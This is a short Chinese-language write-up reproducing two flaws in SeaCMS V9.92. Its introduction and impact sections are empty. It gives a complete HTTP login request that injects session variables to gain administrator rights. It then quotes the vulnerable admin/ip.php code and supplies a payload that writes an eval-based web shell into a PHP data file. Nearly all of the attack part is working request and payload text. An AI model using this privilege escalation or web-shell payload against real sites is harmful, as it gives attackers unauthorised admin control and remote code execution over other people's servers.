Seacms V9.92 越权+Getshell
==========================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### 越权

#### 1、首先注册一个普通用户

#### 2、burp抓包改包，下面是发送payload

    POST /login.php HTTP/1.1
    Host: 0-sec.org
    Content-Length: 49
    Cache-Control: max-age=0
    Origin: http://192.168.8.143
    Upgrade-Insecure-Requests: 1
    DNT: 1
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
    Referer: http://192.168.8.143/login.php
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: PHPSESSID=9smu8an6nvbrqasp5m0o4bmts7
    Connection: close

    dopost=login&userid=test&pwd=123456&validate=djyf&_SESSION[sea_admin_id]=1&_SESSION[sea_ckstr]=djyf

#### 3、 登陆后台页面，可以发现管理员账户变成-1了,也同时拥有管理员的权限

### getshell

/admin/ip.php

    if($action=="set")
    {
        $v= $_POST['v'];
        $ip = $_POST['ip'];
        $open=fopen("../data/admin/ip.php","w" );
        $str='<?php ';
        $str.='$v = "';
        $str.="$v";
        $str.='"; ';
        $str.='$ip = "';
        $str.="$ip";
        $str.='"; ';
        $str.=" ?>";
        fwrite($open,$str);
        fclose($open);
        ShowMsg("成功保存设置!","admin_ip.php");
        exit;

我们再去看一下ip.php格式

    <?php $v = "0"; $ip = " ";  ?>

我们可以构造一下,然后保存

    *;phpinfo();//
    ";@eval($_POST[pp]);//

image
